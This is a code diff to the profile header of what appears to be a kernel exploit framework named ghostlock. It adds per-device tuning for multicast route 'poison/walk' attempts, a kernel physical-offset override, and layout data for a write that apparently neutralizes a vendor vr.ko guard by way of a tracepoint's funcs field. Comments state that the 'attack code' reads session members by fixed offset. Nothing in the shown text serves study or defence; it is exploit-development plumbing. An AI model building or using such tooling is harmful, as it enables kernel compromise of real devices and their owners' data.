@@ -110,9 +110,21 @@ namespace ghostlock::profile {
 
     struct KernelMisc {
         std::optional<uint64_t> kernel_phys_load;
+        /* DRAM base (linear-map PHYS_OFFSET) used for image->direct-map
+         * translation. Absence falls back to the compiled P0_PHYS_OFFSET, so
+         * devices whose DRAM base differs from the built-in default can
+         * override it without a rebuild. */
+        std::optional<uint64_t> kernel_phys_offset;
         std::optional<uint8_t> compact_waiter;
+        /* Ancillary vr.ko guard, occupying this struct's existing padding so the
+         * frozen session offsets do not move: the gate (fail closed), the
+         * tracepoint the vendor probe hangs off, and offsetof(struct tracepoint,
+         * funcs). A zero tracepoint_funcs means the image did not yield it. */
+        uint8_t vr_guard = 0;
+        uint8_t vr_tracepoint_funcs = 0;
         std::optional<uint32_t> kernelsnitch_collisions;
         std::optional<uint32_t> mm_struct_sz;
+        uint32_t vr_sys_exit_tp = 0;
     };
 
     struct RouteGeometry {
@@ -121,6 +133,12 @@ namespace ghostlock::profile {
         std::optional<uint32_t> mcast_buffer_size;
         std::optional<uint32_t> mcast_task_offset;
         std::optional<uint32_t> mcast_lock_offset;
+    };
+
+    /* Multicast route poison/walk repetition; 0 keeps the route default. Values
+     * are the ones the geometry was measured with (128/16/20000). */
+    struct McastTuning {
+        uint32_t attempts = 0, arm_sequence = 0, arm_hold = 0;
     };
 
     /* Native transport representation of one Kotlin-resolved profile. */
@@ -134,6 +152,13 @@ namespace ghostlock::profile {
         KernelMisc misc;
         RouteGeometry geometry;
         struct execution_settings execution;
+        /* Multicast route poison/walk repetition; 0 keeps the route default.
+         * These four bytes live in this struct's existing tail padding: the
+         * attack code reads session members by offset and the cmp_disasm gate
+         * requires its instructions to stay byte-identical, so nothing here may
+         * change sizeof(). */
+        uint8_t mcast_attempts = 0, mcast_arm_sequence = 0;
+        uint16_t mcast_arm_hold = 0;
 
         /* Typed view of the wire route field so callers need no cast. */
         [[nodiscard]] RouteKind route_kind() const noexcept {
@@ -149,6 +174,13 @@ namespace ghostlock::profile {
     struct SelectStackLayout {
         std::optional<int32_t> waiter_shift;
         std::optional<uint8_t> compact_waiter;
+    };
+
+    /* Ancillary vr.ko guard: the two facts the write needs. Both must be
+     * present; each is an image-relative image_offset and a struct-internal
+     * offset, never a kernel-version lookup. */
+    struct VrGuardLayout {
+        std::optional<uint32_t> tracepoint_funcs;
     };
 
     struct TcpZerocopyLayout {
@@ -267,6 +299,29 @@ namespace ghostlock::profile {
 
         [[nodiscard]] bool safe_mode() const noexcept {
             return loaded_ && values_.meta.safe_mode;
+        }
+
+        /* Ancillary vr.ko guard: gate + layout. Absent members mean the
+         * profile does not enable the behavior (see vr_guard.hpp plan()). */
+        [[nodiscard]] bool vr_guard_enabled() const noexcept {
+            return loaded_ && values_.misc.vr_guard != 0;
+        }
+
+        [[nodiscard]] VrGuardLayout vr_guard_layout() const noexcept {
+            if (!loaded_ || values_.misc.vr_tracepoint_funcs == 0) return VrGuardLayout{};
+            return (VrGuardLayout){
+                    .tracepoint_funcs = static_cast<uint32_t>(values_.misc.vr_tracepoint_funcs)};
+        }
+
+        [[nodiscard]] uint64_t vr_sys_exit_tp() const noexcept {
+            return loaded_ ? values_.misc.vr_sys_exit_tp : 0;
+        }
+
+        [[nodiscard]] McastTuning mcast_tuning() const noexcept {
+            return loaded_ ? (McastTuning){.attempts = values_.mcast_attempts,
+                                           .arm_sequence = values_.mcast_arm_sequence,
+                                           .arm_hold = values_.mcast_arm_hold}
+                           : McastTuning{};
         }
 
         [[nodiscard]] MulticastWaiterLayout multicast_layout() const noexcept {
